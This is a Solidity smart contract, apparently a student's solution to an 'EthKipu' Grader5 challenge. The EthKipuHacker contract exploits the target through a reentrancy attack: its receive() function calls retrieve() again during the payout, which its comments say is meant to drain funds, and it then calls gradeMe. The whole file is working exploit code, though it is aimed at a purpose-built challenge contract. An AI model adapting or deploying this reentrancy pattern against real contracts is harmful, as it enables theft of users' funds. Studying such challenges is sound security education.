// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title IGrader5
 * @dev Interface for the Grader5 contract, which exposes functions to retrieve funds and grade a user.
 */
interface IGrader5 {
    /**
     * @notice Retrieve funds from the contract. Payable function.
     */
    function retrieve() external payable;

    /**
     * @notice Grade the user with the provided name.
     * @param name The name to be graded.
     */
    function gradeMe(string calldata name) external;
}

/**
 * @title EthKipuHacker
 * @author <Your Name>
 * @notice This contract is designed to interact with the Grader5 challenge contract, exploiting its logic to repeatedly call retrieve and potentially drain funds using a reentrancy pattern.
 * @dev The contract uses a reentrancy lock to prevent infinite recursion and restricts sensitive functions to the contract owner.
 */
contract EthKipuHacker {
    /// @notice The Grader5 contract instance to interact with.
    IGrader5 private immutable i_grader;
    /// @notice The owner of this contract, set at deployment.
    address private immutable i_owner;
    /// @dev Reentrancy lock to prevent repeated reentrant calls.
    bool private reentrancyLock;

    /**
     * @notice Deploy the EthKipuHacker contract.
     * @param graderAddress The address of the Grader5 contract to interact with.
     */
    constructor(address graderAddress) {
        i_grader = IGrader5(graderAddress);
        i_owner = msg.sender;
    }

    /**
     * @notice Accept ETH deposits to fund the contract for the hack.
     */
    function deposit() external payable {}

    /**
     * @notice Initiates the hack by calling retrieve on the Grader5 contract with 4 wei.
     * @dev Only the owner can call this function. Requires the contract to be funded with at least 4 wei. Resets the reentrancy lock before starting.
     * @custom:security Only callable by the contract owner.
     */
    function hack() external {
        require(msg.sender == i_owner, "You're not the owner");
        require(
            address(this).balance > 3,
            "Contract mustbe funded with at least 4 wei"
        );

        reentrancyLock = false;
        i_grader.retrieve{value: 4}();
    }

    /**
     * @notice Calls gradeMe on the Grader5 contract with the provided name.
     * @param name The name to be graded.
     * @dev Only the owner can call this function.
     * @custom:security Only callable by the contract owner.
     */
    function doGradeMe(string calldata name) external {
        require(msg.sender == i_owner, "You're not the owner");
        i_grader.gradeMe(name);
    }

    /**
     * @notice Receive function to handle incoming ETH and trigger reentrant retrieve call if not locked.
     * @dev Implements a reentrancy lock to prevent infinite recursion. Only triggers another retrieve if not already in a reentrant call.
     */
    receive() external payable {
        if (!reentrancyLock) {
            reentrancyLock = true;
            i_grader.retrieve{value: 4}();
        }
    }
}
